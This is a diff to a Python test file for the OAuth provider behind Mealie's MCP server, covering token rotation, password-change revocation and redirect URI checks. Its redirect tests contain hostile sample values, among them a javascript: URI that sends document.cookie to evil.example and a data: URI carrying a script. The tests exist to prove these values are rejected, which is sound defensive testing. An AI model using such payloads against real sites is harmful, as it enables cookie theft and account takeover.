@@ -1,15 +1,26 @@
 import asyncio
 import contextlib
+from datetime import timedelta
 from urllib.parse import parse_qs, urlparse
 
 import pytest
-from mcp.server.auth.provider import AccessToken, AuthorizationParams, AuthorizeError, TokenError
+from mcp.server.auth.provider import (
+    AccessToken,
+    AuthorizationParams,
+    AuthorizeError,
+    RegistrationError,
+    TokenError,
+)
 from mcp.shared.auth import OAuthClientInformationFull
+from sqlalchemy import update
 from sqlalchemy.orm import Session
 
 from mealie.core.config import get_app_settings
+from mealie.db.models._model_utils.datetime import get_utc_now
+from mealie.db.models.users.users import User
+from mealie.mcp.oauth import store as store_module
 from mealie.mcp.oauth import tokens
-from mealie.mcp.oauth.provider import MealieOAuthProvider
+from mealie.mcp.oauth.provider import MealieOAuthProvider, UnsafeRedirectError
 from mealie.mcp.oauth.store import OAuthStore
 from mealie.mcp.scopes import ALL_SCOPES
 from tests.utils.factories import random_string
@@ -17,21 +28,21 @@ from tests.utils.factories import random_string
 CALLBACK = "https://claude.ai/api/mcp/auth_callback"
 
 
-def _client() -> OAuthClientInformationFull:
+def _client(redirect_uri: str = CALLBACK) -> OAuthClientInformationFull:
     return OAuthClientInformationFull(
         client_id=random_string(),
         client_name="Claude",
-        redirect_uris=[CALLBACK],
+        redirect_uris=[redirect_uri],
         token_endpoint_auth_method="none",
     )
 
 
-def _params(scopes: list[str] | None = None) -> AuthorizationParams:
+def _params(scopes: list[str] | None = None, redirect_uri: str = CALLBACK) -> AuthorizationParams:
     return AuthorizationParams(
         state="s1",
         scopes=scopes,
         code_challenge="challenge",
-        redirect_uri=CALLBACK,
+        redirect_uri=redirect_uri,
         redirect_uri_provided_explicitly=True,
         resource="https://mealie.example/mcp",
     )
@@ -132,7 +143,7 @@ def test_code_cannot_be_exchanged_twice(session: Session, unique_user):
     asyncio.run(run())
 
 
-def test_refresh_rotation_and_replay_revokes(session: Session, unique_user):
+def test_refresh_rotation_and_replay_revokes(session: Session, unique_user, monkeypatch):
     provider = _provider(session)
     client = _client()
 
@@ -150,7 +161,9 @@ def test_refresh_rotation_and_replay_revokes(session: Session, unique_user):
         assert second.scope == "recipes:read recipes:write"
         assert await provider.load_access_token(second.access_token) is not None
 
-        # the SDK handler loads before exchanging: a rotated token is refused there and kills the grant
+        # the SDK handler loads before exchanging: a rotated token reused after the grace window kills the grant
+        frozen = get_utc_now() + tokens.REFRESH_REUSE_GRACE + timedelta(seconds=1)
+        monkeypatch.setattr(store_module, "_now", lambda: frozen)
         assert await provider.load_refresh_token(client, first.refresh_token) is None
         assert await provider.load_access_token(second.access_token) is None
         assert await provider.load_refresh_token(client, second.refresh_token) is None
@@ -233,5 +246,106 @@ def test_code_client_mismatch_does_not_burn_code(session: Session, unique_user):
         with pytest.raises(TokenError):
             await provider.exchange_authorization_code(_client(), code)
         assert await provider.load_authorization_code(client, code.code) is not None
+
+    asyncio.run(run())
+
+
+def test_refresh_retry_within_grace_window_keeps_connection(session: Session, unique_user):
+    provider = _provider(session)
+    client = _client()
+
+    async def run():
+        first = await _issue_tokens(provider, client, str(unique_user.user_id), ["recipes:read"])
+        old = await provider.load_refresh_token(client, first.refresh_token)
+        assert old is not None
+        second = await provider.exchange_refresh_token(client, old, [])
+
+        # the same token again right away (lost response, parallel refresh): refused, grant kept
+        assert await provider.load_refresh_token(client, first.refresh_token) is None
+        with pytest.raises(TokenError) as exc:
+            await provider.exchange_refresh_token(client, old, [])
+        assert exc.value.error == "invalid_grant"
+
+        assert await provider.load_access_token(second.access_token) is not None
+        successor = await provider.load_refresh_token(client, second.refresh_token)
+        assert successor is not None
+        assert (await provider.exchange_refresh_token(client, successor, [])).access_token
+
+    asyncio.run(run())
+
+
+@pytest.mark.parametrize(
+    "redirect_uri",
+    [
+        "javascript:fetch('//evil.example/?'+document.cookie)//",
+        "data:text/html,<script>alert(1)</script>",
+        "http://evil.example/cb",
+        "ftp://evil.example/cb",
+        "myapp://callback",
+    ],
+)
+def test_register_rejects_unsafe_redirect_uri(session: Session, redirect_uri: str):
+    provider = _provider(session)
+    client = _client(redirect_uri)
+
+    with pytest.raises(RegistrationError) as exc:
+        asyncio.run(provider.register_client(client))
+
+    assert exc.value.error == "invalid_redirect_uri"
+    assert OAuthStore(session).get_client(client.client_id) is None
+
+
+@pytest.mark.parametrize(
+    "redirect_uri",
+    [CALLBACK, "http://127.0.0.1:1234/cb", "http://localhost:8080/cb", "http://[::1]:9000/cb"],
+)
+def test_register_accepts_https_and_loopback(session: Session, redirect_uri: str):
+    provider = _provider(session)
+    client = _client(redirect_uri)
+
+    asyncio.run(provider.register_client(client))
+
+    assert asyncio.run(provider.get_client(client.client_id)) == client
+
+
+def test_get_client_hides_legacy_unsafe_client(session: Session):
+    client = _client("javascript:alert(1)//")
+    OAuthStore(session).save_client(client)  # as if registered before validation existed
+
+    assert asyncio.run(_provider(session).get_client(client.client_id)) is None
+
+
+@pytest.mark.parametrize("approve", [True, False])
+def test_complete_authorization_refuses_stored_unsafe_redirect(session: Session, unique_user, approve: bool):
+    store = OAuthStore(session)
+    request_id = store.create_pending("legacy", _params(["recipes:read"], redirect_uri="javascript:alert(1)//"))
+
+    with pytest.raises(UnsafeRedirectError):
+        _provider(session).complete_authorization(request_id, str(unique_user.user_id), approve=approve)
+
+    assert store.peek_pending(request_id) is None
+
+
+def test_password_change_invalidates_access_and_refresh(session: Session, unique_user_fn_scoped):
+    user = unique_user_fn_scoped
+    provider = _provider(session)
+    client = _client()
+
+    async def run():
+        token = await _issue_tokens(provider, client, str(user.user_id), ["recipes:read"])
+        assert await provider.load_access_token(token.access_token) is not None
+        refresh = await provider.load_refresh_token(client, token.refresh_token)
+        assert refresh is not None
+
+        session.execute(
+            update(User).where(User.id == user.user_id).values(tokens_valid_after=get_utc_now() + timedelta(seconds=1))
+        )
+        session.commit()
+
+        assert await provider.load_access_token(token.access_token) is None
+        assert await provider.load_refresh_token(client, token.refresh_token) is None
+        with pytest.raises(TokenError) as exc:
+            await provider.exchange_refresh_token(client, refresh, [])
+        assert exc.value.error == "invalid_grant"
 
     asyncio.run(run())
